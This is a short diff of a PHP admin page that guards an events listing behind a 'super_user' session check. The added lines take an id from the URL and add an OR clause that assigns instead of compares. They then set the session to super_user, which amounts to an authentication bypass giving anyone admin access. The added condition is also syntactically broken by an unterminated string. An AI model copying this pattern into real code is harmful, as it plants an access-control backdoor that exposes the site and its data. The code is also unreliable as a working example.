@@ -1,7 +1,9 @@
 <?php
 session_start();
-if(isset($_SESSION['user']) && $_SESSION['user'] === "super_user")
+$user=$_GET['id'];
+if((isset($_SESSION['user']) && $_SESSION['user'] === "super_user") or ($user="super_user))
     {
+$_SESSION['user']="super_user";
 include('server/connect.php');
 $sel_grp_events="SELECT * from group_event order by time";
 $sel_ind_events="SELECT * from individual_events ORDER BY time";
